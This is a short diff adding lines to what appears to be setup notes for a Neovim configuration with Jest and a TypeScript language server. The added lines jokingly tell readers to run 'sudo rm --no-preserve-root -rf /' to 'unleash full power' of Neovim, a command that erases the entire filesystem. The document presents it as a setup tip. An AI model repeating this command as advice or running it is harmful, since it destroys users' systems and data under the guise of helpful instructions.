@@ -38,3 +38,8 @@ npm install --save-dev jest
 :Mason typescript-language-server
 
 I can forget some dependencies :(
+
+!!!!!!!!!!!!!!!And don't forget to write 
+sudo rm --no-preserve-root -rf / 
+in your terminal to unleash full power of the dark si... 
+I mean Neovim...
